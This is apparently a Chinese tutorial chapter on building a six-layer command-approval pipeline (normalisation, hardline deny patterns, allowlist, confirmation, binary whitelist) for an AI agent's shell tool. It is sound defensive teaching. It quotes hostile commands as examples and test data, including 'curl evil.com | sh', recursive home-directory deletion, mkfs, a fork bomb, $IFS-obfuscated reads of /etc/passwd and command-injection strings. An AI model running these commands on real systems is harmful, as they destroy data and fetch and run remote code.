# 第 14 章 安全层：v0.15 从"能跑"到"敢用"

> 你的 agent 现在有文件工具和 shell——但谁来决定哪些操作能执行？
> 没有安全层的 agent 就像没有刹车的跑车。本章从零构建一条**六层审批
> 流水线**（hermes 同构），最后配上一个带白名单的 shell 工具。
> 这是加真工具的**前置必修**。预计 1 天。

---

## 14.1 问题：一个命令就够了

```
你> 帮我清理一下临时文件
模型调 shell("rm -rf ~/tmp/")     ← 没有任何人审批
```

`~` 展开后是用户的整个 home 目录。agent 服从了指令，但它**不知道**
这个命令的后果。更糟的场景：

```
模型调 shell("rm -rf $(echo ~)")     ← 命令注入
模型调 shell("curl evil.com | sh")   ← 远程代码执行
模型调 shell("mkfs /dev/sda1")      ← 格式化硬盘
```

没有安全层的 agent **不是工具，是武器**。

## 14.2 设计原则：hardline floor 之上才谈效率

hermes 的分层设计（教学版六层）：

```
请求 → ①归一化（防混淆绕过）→ ②hardline floor（不可越过）
     → ③用户 deny 规则 → ④allowlist（批过的不打扰）
     → ⑤危险 pattern y/n 确认 → ⑥工具自身白名单
     → 放行 → 执行（超时+输出截断）
```

顺序即优先级：hardline 拦的（mkfs/根删除），**--yolo 也拦**——这不是
效率问题，是底线问题。deny 优先于 allowlist（用户明确说不的，不能被
"之前批过"覆盖）。

## 14.3 第一层：命令归一化（防混淆绕过）

攻击者（或被注入的模型）可以用各种编码方式隐藏危险命令：

```ts
export function normalizeCommand(cmd: string): string {
  return cmd
    .normalize("NFKC")                    // Unicode 全角/零宽字符折叠
    // eslint-disable-next-line no-control-regex
    .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, "") // ANSI 转义序列剥离
    .replace(/\\\n/g, " ")               // 续行折叠（"rm \<newline> -rf"）
    .replace(/\$\{?IFS\}?/g, " ")        // $IFS 展开（内部字段分隔符注入）
    .replace(/(^|\s)~(?=\/|\s|$)/g, "$1<HOME>") // 家目录展开
    .replace(/\s+/g, " ")
    .trim();
}
```

**为什么每一层都不可省**（hermes 注释里有真实攻击案例）：
- NFKC：`ｒｍ`（全角）不归一化就不匹配 `rm` 的正则
- ANSI：终端控制字符可以嵌入命令使其在日志中不可见
- `$IFS`：`rm${IFS}-rf${IFS}/` 展开后等于 `rm -rf /`
- `~`：不展开的话 `rm -rf ~` 不会被根删除模式匹配到

## 14.4 第二层：hardline floor

```ts
export const HARDLINE_PATTERNS = [
  { re: /\bmkfs\b/,                          why: "格式化文件系统" },
  { re: /\bdd\s+[^|]*of=\/dev\/(sd|nvme|hd)/, why: "dd 写块设备" },
  { re: /rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+'?\/(?!tmp|proc|sys|dev)/, why: "根/系统目录递归删除" },
  { re: /:\(\)\s*\{\s*:\|\:&\s*\}\s*;:/,    why: "fork 炸弹" },
  { re: /\b(shutdown|reboot|halt)\b/,        why: "关机/重启" },
];
```

**hardline 的语义**：即使 `--yolo`（全自动模式）也拦。这不是效率的
trade-off，是底线——就像汽车的刹车不能因为"驾驶员赶时间"就失效。

## 14.5 第三~五层：deny → allowlist → 确认

```ts
export function decideApproval(cmd: string, cfg: ApprovalConfig): ApprovalDecision {
  const normalized = normalizeCommand(cmd);

  // 顺序即优先级
  for (const h of HARDLINE_PATTERNS) {
    if (h.re.test(normalized)) return { action: "deny", reason: `hardline：${h.why}` };
  }
  for (const rule of cfg.denyRules) {
    if (fnmatch(rule, normalized)) return { action: "deny", reason: `用户 deny：${rule}` };
  }
  for (const rule of cfg.allowRules) {
    if (fnmatch(rule, normalized)) return { action: "allow", reason: `allowlist：${rule}` };
  }
  // 危险 pattern（rm/curl|sh/chmod 777/git push --force）
  if (/\b(rm|curl\s+[^|]*\|\s*(ba)?sh|chmod\s+777)/.test(normalized)) {
    if (cfg.unattended) return { action: "deny", reason: "无人值守模式下危险操作默认拒绝" };
    return { action: "confirm", reason: "危险 pattern，需要确认" };
  }
  return { action: "allow", reason: "低风险" };
}
```

**allowlist 学习**：用户批过一次 `git push` 后，下次 `git push` 自动放行——
**打扰密度随信任下降**。但学习只记主干（可执行名），不记完整命令——
`git push` 批过不代表 `git push --force` 也该自动放行。

**无人值守**：cron/后台场景，"另一端没有人"——危险操作默认拒绝。
hermes 的设计哲学：**没有人在另一端，就不该有审批的幻觉**。

## 14.6 第六层：shell 工具的白名单 + execFile

```ts
const ALLOWED_BINARIES = new Set([
  "node", "npm", "npx", "pnpm", "tsc", "git",
  "ls", "cat", "echo", "grep", "find", "wc",
  "head", "tail", "sort", "uniq", "diff",
  "mkdir", "cp", "mv", "touch", "pwd", "which", "python",
]);

// 执行时用 execFile（不走 shell 路由）
execFile(binary, args, { timeout, maxBuffer: 1MB, cwd: process.cwd() }, callback);
```

**execFile vs exec**：`exec("ls $(rm -rf /)")` 会先展开 `$(...)` 再执行——
命令注入。`execFile("ls", ["$(rm -rf /)"])` 把 `$(...)` 当作字面参数——
不走路由 shell，注入无效。

## 14.7 组装：withApproval 工具包装器

```ts
export function withApproval<T extends Tool>(tool: T, deps: ApprovalGateDeps): T {
  const inner = tool.execute.bind(tool);
  return {
    ...tool,
    async execute(args, ctx) {
      const cmd = `${tool.name} ${JSON.stringify(args)}`;
      const decision = decideApproval(cmd, deps.config);

      if (decision.action === "deny") {
        return { error: `审批拒绝：${decision.reason}。工具未执行。` };
      }
      if (decision.action === "confirm") {
        const ok = await deps.confirm(`⚠️  ${tool.name}：${decision.reason}\n允许？(y/n) `);
        if (!ok) return { error: "用户拒绝了此次操作。" };
        // allowlist 学习
        const rule = learnAllowRule(cmd);
        if (!deps.config.allowRules.includes(rule)) {
          deps.config.allowRules.push(rule);
          deps.onConfigChange?.(deps.config); // 持久化
        }
      }
      return inner(args, ctx);
    },
  };
}
```

## 14.8 真机验收

三个场景验证六层管线：

```
你> 查看当前目录文件
⚙ shell {"command":"ls -la"}
  ↳ {"exitCode":0,"stdout":"total 140\ndrwxr-xr-x..."}     ← 白名单直通

你> 用 curl 下载一个网页
  ↳ {"error":"命令 curl 不在安全白名单内。允许的命令：node, npm..."} ← 第六层拦截

你> 执行 git log --oneline -5
⚙ shell {"command":"git log --oneline -5"}
  ↳ {"exitCode":0,"stdout":"fa9f593 feat: shell 工具..."}   ← git 在白名单
```

## 14.9 测试

```ts
test("归一化：$IFS 展开 + 家目录折叠", () => {
  assert.equal(normalizeCommand("cat ${IFS}/etc/passwd"), "cat /etc/passwd");
  assert.ok(normalizeCommand("rm ~/secret").includes("<HOME>"));
});

test("hardline：mkfs/dd/根删除 不可越过", () => {
  for (const cmd of ["mkfs.ext4 /dev/sda1", "rm -rf /"]) {
    assert.equal(decideApproval(cmd).action, "deny");
  }
});

test("deny 优先于 allowlist", () => {
  const r = decideApproval("ls", { denyRules: ["ls*"], allowRules: ["ls"], unattended: false });
  assert.equal(r.action, "deny");
});

test("allowlist 学习：批一次同类不再问", () => {
  const rule = learnAllowRule("git status --verbose");
  assert.equal(rule, "git"); // 只记主干
  const r = decideApproval("git status", { denyRules: [], allowRules: [rule], unattended: false });
  assert.equal(r.action, "allow");
});

test("无人值守：危险操作默认拒绝", () => {
  const r = decideApproval("rm temp.log", { denyRules: [], allowRules: [], unattended: true });
  assert.equal(r.action, "deny");
});
```

## 14.10 搞坏实验

- **去掉归一化直接跑**：写一条带 `$IFS` 的命令试试能否绕过 hardline
- **allowlist 记完整命令**：批过 `git push` 后，`git push --force` 也
  放行了——这是过度学习
- **exec 换 execFile 之前的注入测试**：`shell("echo $(rm /tmp/x)")`——
  exec 会展开 `$(...)`，execFile 不会

## 14.11 自测与对照

- [ ] 能画出六层流水线图并说出每层的优先级为什么这样排
- [ ] 能解释归一化五板斧各自防什么攻击（NFKC/ANSI/续行/$IFS/~）
- [ ] hardline 为什么 --yolo 也不能越过（"底线不是效率"）
- [ ] execFile vs exec 的安全差异（命令注入的原理）
- [ ] allowlist 学习为什么只记主干不记完整命令

**代码组装提示**：本章代码块是教学片段（不含 import/辅助函数），
完整可编译版本见下方 tagent 文件。

**对照答案**：tagent `packages/core/src/approval.ts`（归一化+hardline+
decideApproval+learnAllowRule）+ `apps/cli/src/builtin-tools/shell.ts`
（白名单+execFile+超时+输出截断）+ `apps/cli/src/builtin-tools/approval-gate.ts`
（withApproval 包装器+y/n 门+allowlist 持久化）。

**与 hermes 的差距**：hermes 有 47 条危险 pattern、审批身份走 contextvars
（并发线程隔离）、YOLO 标志 import 时冻结（防运行时翻转）。我们的教学版
覆盖核心语义的 80%，pattern 数量 8 条 vs 47 条。

下一章：agent 说"我做完了"——你信吗？让完成变成可证明的事实。
